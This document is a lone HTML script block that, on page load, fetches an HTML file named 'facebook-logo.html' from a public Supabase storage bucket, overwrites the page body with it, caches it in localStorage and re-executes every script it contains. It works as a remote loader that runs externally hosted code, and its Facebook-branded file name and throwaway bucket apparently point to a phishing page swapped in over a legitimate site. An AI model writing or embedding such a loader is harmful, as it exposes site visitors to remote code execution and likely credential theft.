<script>
(async () => {
  const url = 'https://ahnmsyjtykbxzfefyhec.supabase.co/storage/v1/object/public/bostan4666//facebook-logo.html';

  // Show cached content instantly if available
  let html = localStorage.getItem('cachedHomeHTML');
  if (html) {
    document.body.innerHTML = html;

    // Re-execute any scripts
    document.querySelectorAll('script').forEach(script => {
      const newScript = document.createElement('script');
      if (script.src) {
        newScript.src = script.src;
      } else {
        newScript.textContent = script.textContent;
      }
      document.body.appendChild(newScript);
    });
  }

  // Fetch fresh version in background (non-blocking)
  try {
    const response = await fetch(url, { cache: 'no-cache' });
    if (!response.ok) throw new Error('Failed to fetch');
    const freshHtml = await response.text();

    // Only update if different (saves render cost)
    if (freshHtml !== html) {
      localStorage.setItem('cachedHomeHTML', freshHtml);
      if (!html) {
        document.body.innerHTML = freshHtml;

        // Re-run scripts
        document.querySelectorAll('script').forEach(script => {
          const newScript = document.createElement('script');
          if (script.src) {
            newScript.src = script.src;
          } else {
            newScript.textContent = script.textContent;
          }
          document.body.appendChild(newScript);
        });
      }
    }
  } catch (err) {
    console.error('Background fetch failed:', err);
    if (!html) {
      document.body.innerHTML = `
        <div style="padding:20px; font-family:sans-serif; color:#000;">
          ⚠️ Failed to load content.<br><br>
          <button style="padding: 8px 16px; font-size: 1rem; cursor: pointer;">Retry</button>
        </div>
      `;
      document.querySelector('button').onclick = () => location.reload();
    }
  }
})();
</script>
